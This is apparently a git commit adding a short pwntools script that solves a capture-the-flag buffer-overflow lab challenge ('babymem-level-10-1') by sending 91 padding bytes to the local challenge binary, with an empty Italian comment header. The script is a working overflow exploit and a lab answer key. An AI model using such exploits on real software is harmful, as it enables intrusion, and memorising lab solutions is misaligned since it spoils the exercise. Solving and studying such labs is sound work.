33ba5fa9d5b18f4b4b719dd6e5d2c9b5c415b459
Ernesto Pastori <43282001+ernepasto@users.noreply.github.com>
2025-04-05 12:04:47 +0200

    Update babymem-level-10-1.py

--- challenges/bof/babymem-level-10-1.py
+++ challenges/bof/babymem-level-10-1.py
@@ -1,1 +1,20 @@
+#!/usr/bin/python3
+from pwn import *
 
+'''
+-- OBIETTIVO DEL PROGRAMMA --
+
+-----------------------------
+'''
+
+context.log_level = 'CRITICAL'
+
+elf = ELF('/challenge/babymem-level-10-1')
+p = elf.process()
+
+delta_len = 91
+bytestream = b'A' * delta_len
+
+p.sendline(f'{len(bytestream)}'.encode())
+p.sendline(bytestream)
+p.interactive()
